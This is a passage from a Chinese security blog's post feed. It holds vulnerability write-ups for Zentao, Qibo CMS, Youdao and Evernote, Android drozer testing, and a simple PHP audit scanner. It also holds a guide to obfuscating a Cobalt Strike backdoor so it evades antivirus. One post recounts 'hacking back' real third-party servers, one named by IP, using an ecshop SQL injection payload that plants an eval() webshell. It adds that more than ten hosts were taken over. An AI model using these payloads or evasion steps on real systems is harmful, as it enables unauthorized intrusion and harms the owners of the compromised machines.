    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java审计学习笔记-JEECMSx1.4.0两处XSS</title>
    <link href="/2020/07/10/14/"/>
    <url>/2020/07/10/14/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cs免杀后门</title>
    <link href="/2020/07/10/8/"/>
    <url>/2020/07/10/8/</url>
    
    <content type="html"><![CDATA[<h1 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h1><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Import-Module .\Invoke-Obfuscation.psd1<br>Invoke-Obfuscation<br></code></pre></div></td></tr></table></figure><p><img src="/images/9/1.png"><br><img src="/images/9/2.png"><br>设置cs生成的后门的路径</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> scriptpath D:\团队\tools\免杀\payload.ps1<br></code></pre></div></td></tr></table></figure><p><img src="/images/9/3.png"><br>选择混淆模式，这里选string<br><img src="/images/9/4.png"><br>选择混淆方式，这里选择1<br><img src="/images/9/5.png"><br>输出1.ps1<br><img src="/images/9/6.png"><br><img src="/images/9/7.png"></p><h1 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h1><p><a href="/file/Invoke-Obfuscation1595915214502.zip" title="Invoke-Obfuscation.zip">Invoke-Obfuscation</a></p>]]></content>
    
    
    <categories>
      
      <category>免杀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cobalt strike后门</tag>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java审计代码跟进流程(spring)</title>
    <link href="/2020/04/10/22/"/>
    <url>/2020/04/10/22/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">pom.xml是组件引用和其他声明层，组件的引用跟请求过滤之类的在这里<br>*Controller.java是控制层，请求url在这里<br>*service.java是处理层，请求/接口之类的处理在这里<br>*Impl.java也是服务实现层，跟service同，这里有时候会包含有sql语句<br>*dao.java数据处理层，一些数据请求会在这里发生<br>*mapper.xml是数据请求层，sql查询发生在这里     <br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>App测试从0到精通（四大组件之activity组件篇）</title>
    <link href="/2019/12/09/4/"/>
    <url>/2019/12/09/4/</url>
    
    <content type="html"><![CDATA[<h1 id="准备工具-环境"><a href="#准备工具-环境" class="headerlink" title="准备工具/环境"></a>准备工具/环境</h1><p>1.安装drozer<br>2.模拟器<br>什么模拟器都行，这里用到的是逍遥模拟器</p><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>首先做个端口转发</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">adb forward tcp:31415 tcp:31415<br></code></pre></div></td></tr></table></figure><p>然后连接上模拟器上的控制台</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">drozer console connect<br></code></pre></div></td></tr></table></figure><p><img src="/images/4/1.png"><br>然后选择一个要日的app，一顿操作之后获得它的包名</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">com.winsun.IntelligentMarketingAssistant，怎么获得包名请自行百度，drozer命令是<br>run app.package.list -f （安装后的app名称）<br></code></pre></div></td></tr></table></figure><p>或者到反编译后的AndroidManifest.xml文件找<br>首先查看有哪些组件开放：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">run app.activity.info -a 包名<br></code></pre></div></td></tr></table></figure><p><img src="/images/4/2.png"><br>尝试调用一下io.dcloud.PandoraEntry</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">run app.activity.start --component  apk包名 组件名<br></code></pre></div></td></tr></table></figure><p><img src="/images/4/3.png"><br>出现这个提示是因为做了策略了，组件劫持漏洞不可利用，试试其他的<br><img src="/images/4/4.png"><br><img src="/images/4/5.png"><br>组件可以被越权调用且没有提示<br>也就是说除了可以在未登录状态下进行登录之后的操作（绕过登录）之外，还可以尝试利用可以越权的组件做钓鱼劫持：<br><img src="/images/4/6.png"><br>监听刚刚可以调用且没有提示的组件后打开app：<br><img src="/images/4/7.png"><br>全文结束，文末附我的心得<br><a href="/file/anzhuo.txt" title="安卓测试笔记.txt">安卓测试笔记</a></p>]]></content>
    
    
    <categories>
      
      <category>安卓测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>app测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次护网拿下公鸡队的肉鸡</title>
    <link href="/2019/08/17/3/"/>
    <url>/2019/08/17/3/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>19年6月份的事了，突然想起来就写上吧</p><h1 id="事发起因"><a href="#事发起因" class="headerlink" title="事发起因"></a>事发起因</h1><p>因为是蓝队，用的是我司的天眼，在监控的时候无意看到有一个ip针对我方资产做了批量扫描，于是登录我司的威胁情报中心查看该ip，发现被标位可疑IP，根据领导指示，尝试反日</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>百度ip发现为腾讯云<br><img src="/images/3/1.png"><br>扫端口发现3389,3306、80开启，尝试弱口令登录失败，打开129.204.119.104，发现是一个商场网站，进一步测试发现是ecshop系统<br><img src="/images/3/2.png"><br>通过后台登陆处得到版本信息，先知搜索一下该版本的漏洞，发现一个referer注入<br><a href="https://xz.aliyun.com/t/2725" title="先知文章点这里">先知文章点这里</a></p><h2 id="总结得到的信息："><a href="#总结得到的信息：" class="headerlink" title="总结得到的信息："></a>总结得到的信息：</h2><p>1.目标是一个商城网站，商场系统为ecshop<br>2.开了3389，用的是win服务器</p><h1 id="开始日"><a href="#开始日" class="headerlink" title="开始日"></a>开始日</h1><p>尝试一下注入，发现报错，说明存在注入：<br><img src="/images/3/3.png"><br>根据先知的文章，进一步利用漏洞写进了shell：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:<span class="hljs-string">&quot;num&quot;</span>;s:280:<span class="hljs-string">&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;</span>;s:2:<span class="hljs-string">&quot;id&quot;</span>;s:3:<span class="hljs-string">&quot;&#x27;/*&quot;</span>;&#125;<br></code></pre></div></td></tr></table></figure><p>导出1.php，密码1337，相当于</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">file_put_contents(<span class="hljs-string">&#x27;1.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php eval($_POST[1337]); ?&gt;&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>菜刀，启动！<br><img src="/images/3/4.png"><br>翻apache日志，down之<br>然后就是找记录了，把可疑ip提交，封禁<br>因为是肉鸡，继续深入已经没有意义并且没有时间，断了连接之后下一台<br>139.99.<em>.</em><br>还是老样子，简单的信息收集<br><img src="/images/3/5.png"><br>通过收集的信息发现3389、3306开着，存在l.php，通过l.php的标题发现为phpstdy2014版，打开phpmyadmin，尝试弱口令，登录成功，phpmyadmin写shell就不细说了<br>通过whoami发现是管理员组，然后<br><img src="/images/3/6.png"><br>连接之<br><img src="/images/3/7.png"><br>接下来就是各种翻系统日志<br>down之，提交加分<br>就这样在防守期间利用空余的时间拿了十几台肉鸡，有一台还在开youjizz，全屏的那种</p>]]></content>
    
    
    <categories>
      
      <category>渗透实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>实战</tag>
      
      <tag>HW</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有道笔记windows桌面版6.8.0.1代码执行</title>
    <link href="/2019/06/20/2/"/>
    <url>/2019/06/20/2/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞摘要："><a href="#漏洞摘要：" class="headerlink" title="漏洞摘要："></a>漏洞摘要：</h1><p>对输出的内容不做过滤，在预览附件时执行附件的代码，造成代码执行，打开任意文件</p><h1 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h1><p>构造一个pdf，输入iexplore表示打开ie<br><img src="/images/2/1.png"><br>在客户端上传就会触发：<br><img src="/images/2/2.png"><br>打开cmd：<br><img src="/images/2/3.png"><br>改/UF (iexplore)即可<br><img src="/images/2/4.png"></p>]]></content>
    
    
    <categories>
      
      <category>客户端漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>有道云笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>印象笔记6.18.8.718最新版XSS漏洞</title>
    <link href="/2019/06/20/1/"/>
    <url>/2019/06/20/1/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞摘要："><a href="#漏洞摘要：" class="headerlink" title="漏洞摘要："></a>漏洞摘要：</h1><p>对于网页内容不做检查，客户端直接调用网页的附件预览执行附件的恶意代码，导致产生漏洞，理论上甚至可以造成远程代码执行</p><h1 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h1><h2 id="客户端漏洞："><a href="#客户端漏洞：" class="headerlink" title="客户端漏洞："></a>客户端漏洞：</h2><p>首先构造一个pdf：<br><img src="/images/1/1.png"><br>yinxiang.com 官网下载最新版印象笔记安装在浏览器打开网页版印象笔记，创建一个笔记，上传构造好的附件pdf<br><img src="/images/1/2.png"><br>然后保存，在客户端登陆账号，点全部笔记，同步后就会触发：<br><img src="/images/1/3.png"><br>共享给别人(win10 1809)：<br><img src="/images/1/4.png"></p><h2 id="网站漏洞："><a href="#网站漏洞：" class="headerlink" title="网站漏洞："></a>网站漏洞：</h2><p>URL任意重定向<br><a href="https://static.app.yinxiang.com/embedded-web/web/security-login?targetUrl=https://baidu.com">https://static.app.yinxiang.com/embedded-web/web/security-login?targetUrl=https%3A%2F%2Fbaidu.com</a><br><img src="/images/1/5.png"><br><img src="/images/1/6.png"><br>pdf参考文章：<a href="http://blog.nsfocus.net/pdf-vul/">http://blog.nsfocus.net/pdf-vul/</a></p>]]></content>
    
    
    <categories>
      
      <category>客户端漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>印象笔记</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>禅道11.1任意文件操作+越权</title>
    <link href="/2019/02/09/5/"/>
    <url>/2019/02/09/5/</url>
    
    <content type="html"><![CDATA[<h1 id="一、任意文件操作："><a href="#一、任意文件操作：" class="headerlink" title="一、任意文件操作："></a>一、任意文件操作：</h1><p>管理员随便发布一个项目，然后管理员到后台分配一个会员：<br><a href="http://127.0.0.1:1236/company-browse.html">http://127.0.0.1:1236/company-browse.html</a><br><img src="/images/5/1.png"><br>登录这个novy的帐号，去提BUG（评论）：<br><a href="http://127.0.0.1:1236/bug-browse-1.html">http://127.0.0.1:1236/bug-browse-1.html</a><br><img src="/images/5/2.png"><br>随便上传一个允许上传的附件，保存然后点重命名：<br><img src="/images/5/3.png"><br>然后抓包获取数据包，把后缀名改了rar<br><img src="/images/5/4.png"><br>刷新一遍页面即可看到修改后的文件<br><img src="/images/5/5.png"><br><code>http://127.0.0.1:1236/file-edit-1.html</code>此处的请求为评论的顺序，想改哪个就把请求改成对应顺序id，<br>比如：改成<a href="http://127.0.0.1:1236/file-edit-2.html%E5%8D%B3%E8%A1%A8%E7%A4%BA%E6%94%B9%E7%AC%AC%E4%BA%8C%E4%B8%AA%E9%99%84%E4%BB%B6%EF%BC%9A">http://127.0.0.1:1236/file-edit-2.html即表示改第二个附件：</a><br><img src="/images/5/6.png"><br><img src="/images/5/7.png"></p><h1 id="二、越权"><a href="#二、越权" class="headerlink" title="二、越权"></a>二、越权</h1><p>登陆后先重命名自己的附件，抓包获取链接，然后把id改为其他人的附件id即可：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">POST /file-edit-4.html HTTP/1.1 <br>Host: 127.0.0.1:1236 <br>User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:64.0) Gecko/20100101 Firefox/64.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate <br>Referer: http://127.0.0.1:1236/file-edit-2.html  //此处为越权链接 <br>Content-Type: application/x-www-form-urlencoded Content-Length: 24 <br>Connection: close <br>Cookie:; device=desktop; theme=default; lastProduct=1; preBranch=0; preProductID=1; checkedItem=; from=product; docFilesViewType=card; zentaosid=ikitlp7bger294dpts96l9v754; windowWidth=400; windowHeight=151; qaBugOrder=id_desc Upgrade-Insecure-Requests: 1 <br><br><br>fileName=1&amp;extension=rar  //此处为文件操作<br></code></pre></div></td></tr></table></figure><p>修改管理员文件：<br><img src="/images/5/8.png"></p><h1 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h1><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">http://127.0.0.1:1236/file-edit-2.html （http://localhost/file-edit-ID.html）<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OWASPTOP10漏洞</tag>
      
      <tag>任意文件操作</tag>
      
      <tag>越权</tag>
      
      <tag>禅道项目管理系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>齐博CMS审计-SSRF</title>
    <link href="/2019/01/09/12/"/>
    <url>/2019/01/09/12/</url>
    
    <content type="html"><![CDATA[<p>CVE-2019-5725</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>齐博CMS审计-CSRF</title>
    <link href="/2018/12/10/10/"/>
    <url>/2018/12/10/10/</url>
    
    <content type="html"><![CDATA[<p>文件位置<code>\news\member\special.php \member\special.php </code><br><img src="/images/10/1.png"><br>仅在开始前判断是否为登陆状态，查询所在用户组是否有权限在专题里添加内容<br>global.php继续跟进require里没有发现有效防护措施<br>第26行开始对内容页面进行操作 以参数delsp为例，第111行：<br><img src="/images/10/2.png"><br> 问题出在</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">delete_attachment(<span class="hljs-variable">$lfjdb</span>[uid],<span class="hljs-variable">$rsdb</span>[picurl]);    <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-string">&quot;DELETE FROM &#123;<span class="hljs-variable">$_pre</span>&#125;special WHERE uid=<span class="hljs-variable">$lfjuid</span> AND id=&#x27;<span class="hljs-variable">$id</span>&#x27;&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>通过判断id来删除页面及页面附件，此处数据库直接执行DELETE<br>利用第19行特性构造url： <code>special.php?job=delsp</code> 再结合sql查询语句得到url： <code>special.php?job=&amp;id= </code><br>本地搭建一个环境，抓包删除专题<br>生成POC</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;html&gt;<br>  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;<br>  &lt;body&gt;<br>  &lt;script&gt;history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)&lt;/script&gt;<br>&lt;form action=<span class="hljs-string">&quot;http://localhost/news/member/special.php&quot;</span>&gt;<br>      &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;job&quot;</span> value=<span class="hljs-string">&quot;delsp&quot;</span> /&gt;<br>      &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;id&quot;</span> value=<span class="hljs-string">&quot;24&quot;</span> /&gt;<br>      &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;<br>    &lt;/form&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></div></td></tr></table></figure><p>把POC发给攻击对象触发后：<br><img src="/images/10/3.png"><br> 此时再访问首页就可以看到专题已被删除：<br><img src="/images/10/4.png"><br> POC：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">http://localhost/news/member/special.php?job=&amp;id= <br></code></pre></div></td></tr></table></figure><p>其中job=为增删改参数，id为专题id<br>增删改参数： </p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">第92行： elseif(<span class="hljs-variable">$job</span>==<span class="hljs-string">&quot;editsp&quot;</span>)<br>第118行： elseif(<span class="hljs-variable">$job</span>==<span class="hljs-string">&#x27;addsp&#x27;</span>)<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python学习笔记day 2 -第一个扫描器</title>
    <link href="/2018/11/11/19/"/>
    <url>/2018/11/11/19/</url>
    
    <content type="html"><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>一、扫描器的构思<br>二、实施<br>三、调试</p><h2 id="一、扫描器的构思"><a href="#一、扫描器的构思" class="headerlink" title="一、扫描器的构思"></a>一、扫描器的构思</h2><p>打开文件-读取文件内容-匹配正则，判断是否存在关键字，存在则输出内容</p><h2 id="二、实施"><a href="#二、实施" class="headerlink" title="二、实施"></a>二、实施</h2><p>准备好漏洞文件：<br><img src="/images/19/1.png"><br>为了让各个功能层次分明，以后好更新，决定每个漏洞都独立一个模块，新建一个index.py定义一个函数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list_all_file</span>(<span class="hljs-params">path</span>):</span><br>  result = []<br>  a = os.listdir(path) <span class="hljs-comment">#列出当前目录</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>     <span class="hljs-keyword">if</span> os.path.isdir(i): <span class="hljs-comment">#循环，列出目录，如果还是目录那就继续列出</span><br>      e = os.path.join(path,i) <span class="hljs-comment">#路径拼接</span><br>      result.extend(list_all_file(e))<br>     <span class="hljs-keyword">else</span>:<br>       e = os.path.join(path,i)<br>       result.append(e)<br>   <span class="hljs-keyword">return</span> result<br></code></pre></div></td></tr></table></figure><p>然后正式开始，列出路径，过滤只留下php文件</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">a = list_all_file(path=<span class="hljs-string">r&#x27;.&#x27;</span>)<br>b = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a <span class="hljs-keyword">if</span> i. endswith(<span class="hljs-string">&#x27;.php&#x27;</span>)]<br>print(b)<br></code></pre></div></td></tr></table></figure><p>效果图：<br><img src="/images/19/2.png"><br>然后开始分类漏洞，新建info.py、sqlinject.py，用import导入：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sqlinject<br><span class="hljs-keyword">import</span> info<br></code></pre></div></td></tr></table></figure><p>为了让回显带路径+文件，继续定义函数，sqlinject文件：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list_all_file</span>(<span class="hljs-params">path</span>):</span><br>  result = []<br>  a = os.listdir(path) <span class="hljs-comment">#列出当前目录</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>     <span class="hljs-keyword">if</span> os.path.isdir(i): <span class="hljs-comment">#循环，列出目录，如果还是目录那就继续列出</span><br>      e = os.path.join(path,i) <span class="hljs-comment">#路径拼接</span><br>      result.extend(list_all_file(e))<br>     <span class="hljs-keyword">else</span>:<br>       e = os.path.join(path,i)<br>       result.append(e)<br>   <span class="hljs-keyword">return</span> result<br></code></pre></div></td></tr></table></figure><p>然后开始内容，打开读取匹配正则：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">a = list_all_file(path=<span class="hljs-string">r&#x27;.&#x27;</span>) <span class="hljs-comment">#把值存在a</span><br>b = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a <span class="hljs-keyword">if</span> i. endswith(<span class="hljs-string">&#x27;.php&#x27;</span>)] <span class="hljs-comment">#遍历a，找出所有php文件</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> b: <span class="hljs-comment">#循环，打开所有php文件</span><br>  f = <span class="hljs-built_in">open</span>(c)<br>  o = f.read()<br>  auditsql = re.search(<span class="hljs-string">r&quot;\$GET_\[&#x27;id&#x27;\]&quot;</span>,o, re.I) <span class="hljs-comment">#正则开始</span><br>  auditsql2 = re.search(<span class="hljs-string">r&quot;\$POST_\[&#x27;id&#x27;\]&quot;</span>, o, re.I)<br>  auditsql3 = re.search(<span class="hljs-string">r&quot;echo\s.+\$+\S.+\&quot;&quot;</span>,o,re.I)<br>  auditsql4 = re.search(<span class="hljs-string">r&quot;\$+id&quot;</span>, o, re.I)<br>  <span class="hljs-keyword">if</span> auditsql:<br>    print(<span class="hljs-string">&#x27;疑似存在SQL注入漏洞！请查看文件：&#x27;</span>+c,<span class="hljs-string">&#x27;第行：&#x27;</span>+auditsql.group(<span class="hljs-number">0</span>)) <span class="hljs-comment"># group(0)列出匹配到的正则，0或者()是默认列出所有</span><br>  <span class="hljs-keyword">if</span> auditsql2:<br>    print(<span class="hljs-string">&#x27;疑似存在POST注入漏洞！请查看文件：&#x27;</span>+c,<span class="hljs-string">&#x27;第行：&#x27;</span>+auditsql2.group(<span class="hljs-number">0</span>))<br>  <span class="hljs-keyword">if</span> auditsql3:<br>    print(<span class="hljs-string">&#x27;疑似存在SQL注入漏洞！请查看文件：&#x27;</span>+c,<span class="hljs-string">&#x27;第行：&#x27;</span>+auditsql3.group(<span class="hljs-number">0</span>))<br>  <span class="hljs-keyword">if</span> auditsql4:<br>    print(<span class="hljs-string">&#x27;疑似存在SQL注入漏洞！请查看文件：&#x27;</span> + c, <span class="hljs-string">&#x27;第行：&#x27;</span> + auditsql4.group(<span class="hljs-number">0</span>))<br>  f.close()<br></code></pre></div></td></tr></table></figure><p>效果图：<br><img src="/images/19/3.png"><br>info文件：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list_all_file</span>(<span class="hljs-params">path</span>):</span><br>  result = []<br>  a = os.listdir(path)<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>     <span class="hljs-keyword">if</span> os.path.isdir(i):<br>      e = os.path.join(path,i)<br>      result.extend(list_all_file(e))<br>     <span class="hljs-keyword">else</span>:<br>       e = os.path.join(path,i)<br>       result.append(e)<br>  <span class="hljs-keyword">return</span> result<br><br>a = list_all_file(path=<span class="hljs-string">r&#x27;.&#x27;</span>)<br>b = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a <span class="hljs-keyword">if</span> i. endswith(<span class="hljs-string">&#x27;.php&#x27;</span>)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    f = <span class="hljs-built_in">open</span>(i)<br>    u = f.read()<br>    auditinfo = re.search(<span class="hljs-string">r&quot;phpinfo\(\)&quot;</span>,u,re.I)<br>    <span class="hljs-keyword">if</span> auditinfo:<br>      print(<span class="hljs-string">&#x27;存在phpinfo信息泄露漏洞！文件：&#x27;</span> +i, <span class="hljs-string">&#x27;第行：&#x27;</span> + auditinfo.group(<span class="hljs-number">0</span>))<br>    f.close()<br></code></pre></div></td></tr></table></figure><p>效果图：<br><img src="/images/19/4.png"></p><h3 id="三、调试"><a href="#三、调试" class="headerlink" title="三、调试"></a>三、调试</h3><p><img src="/images/19/5.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>关于以下函数不太熟练</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">path<br>result<br>extend<br>append<br>endswith<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
